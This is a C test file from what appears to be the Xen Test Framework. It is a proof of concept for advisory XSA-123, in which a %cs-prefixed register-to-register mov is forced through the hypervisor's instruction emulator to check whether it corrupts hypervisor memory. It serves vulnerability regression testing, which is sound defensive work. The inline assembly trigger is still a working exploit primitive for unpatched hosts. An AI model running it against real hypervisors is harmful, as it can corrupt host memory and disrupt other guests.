/**
 * @file tests/xsa-123/main.c
 * @ref test-xsa-123
 *
 * @page test-xsa-123 XSA-123
 *
 * Advisory: [XSA-123](https://xenbits.xen.org/xsa/advisory-123.html)
 *
 * An x86 instruction destination operand is either a memory reference or a
 * register.  Memory references always have an associated selector, and
 * typically default to %%ds if not specified.  The selector is not relevant
 * however for a destination register operand.
 *
 * Before XSA-122, an enumeration representing an explicit segment override on
 * a register destination instruction wasn't dropped, and would be stashed in
 * a union, aliasing the lower half of a pointer into the register block on
 * the stack.
 *
 * Register-destination instructions don't usually trap for emulation, and
 * explicit segment overrides are rare in general.  Compilers also make it
 * hard to accidentally have a segment override for a register-destination
 * instruction.
 *
 * This test explicitly forces a `%%cs:mov %%reg, %%reg` instruction through
 * the x86 instruction emulator.  If the destination register doesn't match
 * the source register, hypervisor memory corruption has occurred.
 *
 * @see tests/xsa-123/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-123 PoC";

bool test_needs_fep = true;

void test_main(void)
{
    unsigned int src = 0x1234, dest = 0;

    asm volatile(_ASM_XEN_FEP
                 /* Explicit %cs segment override. */
                 ".byte 0x2e; mov %[src], %[dest]"
                 : [src] "+r" (src), [dest] "+r" (dest));

    if ( dest != 0x1234 )
        xtf_failure("  '%%cs:mov %%reg, %%reg' clobbered hypervisor memory\n");
    else
        xtf_success("  '%%cs:mov %%reg, %%reg' was emulated correctly\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
